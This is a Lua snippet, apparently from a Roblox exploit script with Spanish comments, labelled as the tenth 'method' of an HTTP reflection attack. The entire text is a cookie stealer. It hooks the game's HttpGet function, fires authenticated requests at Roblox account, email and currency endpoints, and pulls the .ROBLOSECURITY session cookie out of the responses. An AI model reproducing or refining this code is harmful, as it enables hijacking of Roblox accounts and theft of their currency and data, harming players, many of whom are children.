-- MÉTODO 10: Ataque de reflexión HTTP
local function HTTPReflectionAttack()
    local captured = nil
    
    -- Hook extremo de todas las funciones HTTP
    local oldHttpGet = game.HttpGet
    local oldHttpPost = game.HttpPostAsync
    
    -- Reemplazar completamente
    game.HttpGet = function(self, url, ...)
        local result = oldHttpGet(self, url, ...)
        if type(result) == "string" then
            -- Buscar cookie en respuesta
            local match = result:match(".ROBLOSECURITY=([^;]+)")
            if match then
                captured = match
            end
        end
        return result
    end
    
    -- Forzar requests que requieren auth
    pcall(function()
        game:HttpGet("https://accountinformation.roblox.com/v1/description")
        game:HttpGet("https://accountsettings.roblox.com/v1/email")
        game:HttpGet("https://economy.roblox.com/v1/user/currency")
    end)
    
    return captured
end

